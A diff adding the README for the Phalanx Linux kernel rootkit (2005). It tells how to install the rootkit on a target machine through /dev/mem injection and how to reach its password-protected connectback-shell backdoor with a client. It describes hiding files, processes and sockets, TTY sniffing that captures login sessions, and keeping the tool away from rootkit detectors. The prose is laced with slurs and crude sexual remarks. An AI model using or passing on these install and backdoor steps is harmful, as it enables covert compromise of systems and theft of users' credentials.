@@ -1,0 +1,246 @@
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+= PHALANX rootkit beta6                     =
+= (C) 2005 by rebel <rebel@pulltheplug.org> =
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+1. about
+2. installing
+3. usage
+4. version history
+5. notes
+6. pheerz
+
+:::::::::.  .. ___  .............................. _____ .......... .
+::::::::::: ___|  \___________________   _________ |   \_
+::::...:::: |  l    \____ \_   |_____ \_|     \   \|   _/..... 
+:::::::::::_|  _   /  ___  |   |  ___  |  _    \_  |  /  :   :
+::::::::::'\   |   |    l  |   |___ l  |  |     |     \  :...:..... .
+:::::  .... \__|   |____   |__     /_  |__|    _|  |   \__   :
+:::::  :  :    l____/   |__/  |___/ |__/  l___/____|     /   :
+:::::..:  :....................................... |____/ ...:
+                                                 :........:
+           __  ____      __     __         /  __
+           \ \  |__)|__||__||  |__||\ |\__/  / / [Mur05]!
+            \_\ |   |  ||  ||__|  || \|/  \ /_/ 
+                :      :       :   :       \
+                .      .       .           
+                       .           .      
+                .                          
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+1. ABOUT
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+You are reading the "READMEFILE" for the brand spanking new
+PHALANX rootkit. Phalanx is a self-injecting kernel rootkit designed
+for the Linux 2.6 branch.
+
+It uses /dev/mem to inject hostile code into
+kernel-memory and hijack syscalls, afaik this is the first rootkit to
+utilize the /dev/mem interface. So, why /dev/mem and not the traditional
+and considerably more handy /dev/kmem? It was recently ruled out as a
+"security-risk" and has therefore been disabled by default on recent
+linux kernels. Somehow the retarded 10-year olds who maintain the linux
+kernel felt that being able to access kernel memory in a device is
+a risk, but having another device that can access ALL MEMORY, including
+kernel memory, is fine. Here's a diagram that explains their confusion:
+
++---------------------------------------------+
+ ***********  M E M O R Y ******************
+                        +PICTUES OF BEARDS+
+        +KERNEL MEMORY+
+  +STUPID FUCKING GAY ASS SLASHDOT COMMENTS+ << bigger than the kernel
+   +PORN+         +#TEENCHAT BACKLOG+
+ *******************************************
++---------------------------------------------+
+
+As you can see from the scientifically correct representation above of a
+linux developer's workstation memory, "KERNEL MEMORY" is actually
+*A PART OF THE MEMORY ITSELF*. This means we can manipulate the kernel
+if we have access to the system memory. Schweet.
+I might also add that the people at Fedora have made some sort of
+protection against these things, you aren't supposed to access
+stuff over a 1M limit or so in /dev/mem. Unfortunately they are high
+on cocaine and didn't implement it very well.
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+2. INSTALLING
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+Run ./setup.sh and follow the instructions to create
+an install-tarball. Transfer this file (ph.tgz) to
+the destination computer and just do:
+tar xfz ph.tgz;cd ph;sh install.sh
+
+
+to uninstall, run "./phalanx u"
+to insert again, run "./phalanx i"
+
+example output:
+____________________________
+| phalanX injector beta 6  |
+| %rebel% .  november 2005 |
+----------------------------
+idt_table; 0xc03e3000
+sys_call_table; 0xc038e5e0
+__kmalloc; 0xc013c4d4                    
+call_usermodehelper_keys; 0xc012426e                        
+find_task_by_pid_type; 0xc0124f46              
+tcp4_seq_show; 0xc02fb92f 
+testing the userland process spawning code..[OK]
+hooking syscalls..[read]..[lstat64]..[lstat]..[execve]..[getdents64]..[tcp4_seq_show]..[open]
+
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+3. USAGE
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+q: How do I access the backdoor?
+a: After you have installed it in your lab-environment(tm), access the
+backdoor by using the phalanx client. Syntax is as follows:
+./client -h <host> -p <port> -l [listenport] -i [connectback ip]
+
+mandatory
+---------
+host: the infected lab-computer
+port: the port on the lab-computer where we send the magic string
+
+optional
+--------
+listenport: port to listen for connectback shell on, default is random
+connectback ip: ip for the connectback shell to connect to, default
+is first ip in /sbin/ifconfig
+
+
+Once you are in, it will look something like this:
+eax:~/kernel/phalanx% ./client -h phalanx -p 22 -i 10.0.0.1
+phalanx client - rebel nov 05
+listening on 10.0.0.1:40625..
+password: 
+[ phalanX beta 6 connected ]
+RAPE TIME!
+Linux phalanx 2.6.14 #1 Thu Nov 3 17:20:16 CET 2005 i686 GNU/Linux
+phalanx:~; 
+
+**********************************************************************
+
+q: How do I hide my porn dir?
+a: If you set the haxorsuffix to ".ph1"..mv porn porn.ph1 ya genius
+
+**********************************************************************
+
+q: How do I hide process x?
+a: All processes with the phalanx-gid are hidden.
+
+**********************************************************************
+
+q: How do I hide my tcp socket to www.gsfc.nasa.gov?
+a: Same as with processes.
+
+**********************************************************************
+
+q: How does the tty-sniffing work?
+a: You will find files in ~/tty named after the pid being sniffed,
+files *should* be grouped into process groups so that when, for example,
+bash executed passwd, it won't end up in different files. This works on 2.6.12->
+right now anyway, on vanilla kernels.
+So, in these files you will find the complete data stream being read from the
+tty file descriptor, if you are lucky and some user is logging in by openssh,
+you will also get a full session output from the sshd pid.
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+4. VERSION HISTORY
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+beta 1
+Sat Oct 22 11:59:04 CEST 2005:
+Implemented the core.
+* Backdoor
+* File hiding
+* Process hiding
+
+beta 2
+Thu Oct 27 00:50:15 CEST 2005:
+* Socket hiding
+* Fixed a bug where you couldn't remove hidden files.
+* Improved process hiding (stat/open will fail on hidden processes in /proc)
+
+beta 3
+Thu Nov  3 04:05:16 CET 2005:
+* TTY-sniffer
+* Improved obfuscation (you can't really call it encryption
+now can you) in the connectback shell, the xor keys will
+change over time during the connection.
+
+beta 4
+Tue Nov  8 00:15:05 CET 2005:
+* Fedora & Gentoo support.
+* Improved overall stability on various kernels.
+
+beta 5
+Wed Nov  9 23:10:10 CET 2005:
+* Improved file hiding
+* Bugfixes
+* Added setup-script to make a convenient tarball for installation
+* Added password to the backdoor
+
+beta 6
+Thu Nov 17 09:55:26 CET 2005:
+* Autostart after reboot
+* Configurable GID & suffix.
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+5. NOTES
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+I'd like to issue a BIG FUCKING WARNING PLEASE IF I MAY.
+This code is still in early beta, and although I have tested
+it successfully on a couple of machines, don't slash your wrists
+if you get a kernel panic slammed in your honky ass face. I take
+no responsibility for lost porn caused by incredibly weird kernel
+behaviour. If you run the injector twice in a row (install, then
+install again without an uninstall in between) you WILL crash the
+kernel. So maybe you shouldn't do that.
+
+******************************************************************
+Also, most importantly, I TAKE NO RESPONSIBILITY FOR PEOPLE'S USE
+OF THIS CODE. IF YOU ARE AN ADMIN READING THIS, I, rebel aka ruler
+of the universe, DID NOT HACK YOUR MACHINE. I CAN'T DO THAT ANYMORE.
+DON'T MESS WITH MY HEAD.
+******************************************************************
+
+Anything else? This is sort of private code right now, if you have
+this right now then you probably know me, if not then I hope you
+break the chain of distribution so that this doesn't end up on
+packetstorm. It would be pretty lame if chkrootkit/rkhunter etc.
+would get signatures of phalanx, so only share with friends & family
+you trust.
+
+
+tested on:
+2.6.11-1.1369_FC4	(Fedora core 4)
+2.6.13-1.1532_FC4	(Fedora core 4)
+2.6.12.5		(Vanilla)
+2.6.13.4		(Vanilla)
+2.6.14			(Vanilla)
+2.6.8-686-2		(Debian)
+2.6.12-gentoo-r6	(Gentoo)
+2.6.10-v		(Ubuntu)
+
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+6. PHEERZ
++=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+
+I'd like to thank Nicon for sending me lots of kernels to look at,
+it helped a lot when I was looking for patterns in functions (then I figured
+it was better to just search for symbols :p). I would also like to thank
+Jesus for being a loser and blabla bla and blablablablablla you get the idea.
+
+this is lame but i'm gonna send out some mad greetz cause that
+is how it works in our social ruleset
+pHEERZ to my peerz: mA, izik, camel, xort, pR, redsand, ryen,
+core, bluefox, nemo, nebunu, bsdaemon, h3x4, murdoc, etrnlecho & #learn
+also mad assgreets to #social on irc.pulltheplug.org
+
+cheerio, tata and good luck!
+%rebel%
